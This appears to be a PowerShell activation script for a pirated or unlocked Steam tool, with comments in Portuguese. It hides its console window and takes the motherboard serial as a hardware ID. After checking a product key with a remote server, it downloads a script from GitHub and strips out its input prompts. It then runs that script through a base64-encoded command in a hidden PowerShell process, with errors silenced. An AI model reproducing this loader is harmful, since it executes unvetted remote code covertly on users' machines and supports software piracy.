# 1. Oculta a janela inicial (Console)
$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {
        
        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")

        # Usando @' (aspas simples) para blindar as variáveis
        $bgTask = @'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        try {
            # Baixa o script original como uma string
            $rawScript = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
            
            # Divide o script em várias linhas (Resolve problemas de formatação da web)
            $linhas = $rawScript -split '\r?\n'
            $scriptLimpo = @()
            
            # --- O ANALISADOR LINHA POR LINHA ---
            foreach ($linha in $linhas) {
                
                # Se a linha contiver "ReadKey" (O problema do Steamtools)
                if ($linha -match 'ReadKey') {
                    $scriptLimpo += 'Start-Sleep -Seconds 2' # Substitui pela pausa silenciosa
                    continue
                }
                
                # Se a linha contiver "KeyAvailable" (O problema do Millennium)
                if ($linha -match 'KeyAvailable') {
                    $scriptLimpo += 'if ($false) {' # Torna a condição falsa para não cancelar
                    continue
                }
                
                # Se a linha contiver a variável do timer do Millennium
                if ($linha -match 'milleniumTimer\s*=') {
                    $scriptLimpo += '$milleniumTimer = 0' # Zera o tempo instantaneamente
                    continue
                }
                
                # Se for uma linha normal, apenas adiciona ao nosso script limpo
                $scriptLimpo += $linha
            }
            
            # Junta todas as linhas de volta em um único código
            $s = $scriptLimpo -join "`n"

            # Executa a instalação
            Invoke-Expression $s

            # Baixa o aviso e abre no notepad
            $wUrl = 'https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt'
            $path = "$env:TEMP\warning.txt"
            (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
            Start-Process notepad.exe $path
            
        } catch {
            # Falha silenciosa em background
        }
'@

        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
        
        # Dispara o processo em background absoluto
        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
        
        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
